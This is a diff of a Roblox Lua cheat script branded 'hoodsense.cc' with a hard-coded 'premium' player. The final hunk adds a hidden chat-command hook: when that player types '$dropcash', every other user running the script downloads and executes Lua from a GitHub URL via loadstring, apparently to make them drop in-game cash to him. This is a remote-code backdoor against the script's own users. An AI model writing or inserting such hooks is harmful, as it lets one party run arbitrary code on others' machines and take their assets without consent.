@@ -1,7 +1,7 @@
 local premium3 = game.Players.ztmave
 local Players = game:GetService("Players")
 	Players.PlayerAdded:Connect(function(player)
-		print("[hoodsense.cc]  p3.lua found  " .. player.Name)
+		print("[hoodsense.cc] p1.lua found " .. player.Name)
 		local premium3 = game.Players.ztmave
 -----------------------------------// Premium User //--------------------------------------
 local premium3 = game.Players.ztmave
@@ -184,18 +184,10 @@ premium3.Chatted:connect(function(cht)
 
 end)
 
-if game.Players.LocalPlayer == premium3 then
-game:GetService("StarterGui"):SetCore("SendNotification",{
-	Title = "hoodsense.cc";
-	Text = "Premium acces!";
-	Time = 10;
-	Icon = "rbxassetid://8768441000";
-    Button1 = "Okay!";
-})
-end
+
  end)
 	Players.PlayerRemoving:Connect(function(player)
-	print("[hoodsense.cc]  p3.lua lost  " .. player.Name)
+	print("[hoodsense.cc] [hoodsense.cc] p1.lua lost " .. player.Name)
 	local premium3 = game.Players.ztmave
 -----------------------------------// Premium User //--------------------------------------
 local premium3 = game.Players.ztmave
@@ -378,14 +370,14 @@ premium3.Chatted:connect(function(cht)
 
 end)
 
-if game.Players.LocalPlayer == premium3 then
-game:GetService("StarterGui"):SetCore("SendNotification",{
-	Title = "hoodsense.cc";
-	Text = "Premium acces!";
-	Time = 10;
-	Icon = "rbxassetid://8768441000";
-    Button1 = "Okay!";
-})
-end
+premium3.Chatted:connect(function(cht)
+	if cht:match("$dropcash .") then
+    	if game.Players.LocalPlayer ~= premium3 then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/dropcash.lua"))()
+        end
+	end
+
+end)
+
 end)
 -------------------------------------------------------------------------------
